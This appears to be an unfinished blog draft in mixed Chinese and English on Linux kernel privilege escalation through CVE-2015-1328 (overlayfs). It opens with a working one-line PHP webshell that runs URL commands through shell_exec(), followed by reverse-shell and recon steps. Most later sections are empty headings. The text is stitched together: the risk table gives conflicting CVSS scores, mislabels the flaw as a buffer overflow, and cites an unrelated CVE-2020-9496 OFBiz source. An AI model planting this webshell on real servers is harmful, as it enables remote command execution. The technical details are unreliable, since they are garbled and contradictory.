# Linux Privilege Escalation Kernel Exploits | Linux本地内核提权漏洞复现 CVE-2015-1328

@[toc]

## 1. 文件上传-一句话木马
    As PHP is still the most common server side scripting language, let's have a look at some simple code for this. In a very basic one line format:
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
    This will take a GET parameter in the URL and execute it on the system with `shell_exec()`

## 2. 开启监听

## 3. 输入命令-反弹Shell命令

Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.
This will take a GET parameter in the URL and execute it on the system with shell_exec().
访问webshell，url中输入

建立连接getshell
开始准备提权
搜集信息-命令-脚本-工具
`uname -a ; lsb_release -a; cat /proc/version /etc/issue /etc/*-release; hostnamectl | grep Kernel`
检索相关exp-searchsploit-exploit-db-

Compiling the Exploit
Executing Kernel Exploits


[TOC]

# 1. 概述

## 1.1 Overlayfs

Overlayfs是一种类似aufs的一种堆叠文件系统，于2014年正式合入Linux-3.18主线内核，目前其功能已经基本稳定（虽然还存在一些特性尚未实现）且被逐渐推广，特别在容器技术中更是势头难挡。

![overlayfs](./img/overlayfs.jpg
)

## 1.2 漏洞简述

在 Ubuntu 3.19.0-21.21 到 15.04 之前的 linux（又名 Linux 内核）包中的 overlayfs 实现没有正确检查上层文件系统目录中文件创建的权限，这允许本地用户通过利用以下配置来获得 root 访问权限：在任意挂载命名空间中允许使用 overlayfs。


## 1.3 风险等级

|  评定方式   | 等级  |
|  ----  | ----  |
| CVSS Score | 7.2 |
| CVSS Score | 9.3 |
| Confidentiality Impact  | Complete |
| Integrity Impact  | Complete |
| Availability Impact  | Complete |
| 实现难度  | 低 |
| 基础权限  | 不需要 |
| 漏洞类型  | 缓存区溢出 |

![]()

## 1.4 影响范围

** **

## 1.5 漏洞详情



# 2. 环境配置

## 2.1 方案一

## 2.2 方案二

## 2.3 访问测试


# 3. 漏洞复现


## 3.1 准备工作



### 准备Payload




## 3.2 漏洞利用



# 4. 修复建议



# 5. 总结



# 6. References

CVE Details (2020) _CVE-2020-9496_. Available at: https://www.cvedetails.com/cve/CVE-2020-9496/...(Accessed: 22 Aug 2022).


东塔网络安全学院. (2021) 'Apache Ofbiz XMLRPC RCE漏洞（CVE-2020-9496）复现', _CSDN_, 20 Feb. Available at: https://blog.csdn.net/m0_48520508/article/details/...(Accessed: 22 Aug 2022).
